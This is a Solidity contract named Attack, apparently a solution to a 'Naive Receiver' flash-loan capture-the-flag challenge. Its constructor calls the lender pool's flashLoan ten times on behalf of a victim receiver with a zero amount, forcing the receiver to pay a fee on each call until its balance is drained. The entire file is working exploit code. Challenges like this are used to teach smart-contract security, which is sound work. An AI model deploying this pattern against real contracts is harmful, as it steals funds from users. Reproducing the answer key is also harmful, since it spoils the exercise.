// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

interface INaiveReceiverLenderPool {
    function flashLoan(address borrower, uint256 borrowAmount) external;
}

contract Attack {
    INaiveReceiverLenderPool private lenderPool;

    constructor(address _lenderPool, address _receiver) {
        lenderPool = INaiveReceiverLenderPool(_lenderPool);

        for (int256 i; i < 10; ++i) {
            lenderPool.flashLoan(_receiver, 0);
        }
    }
}
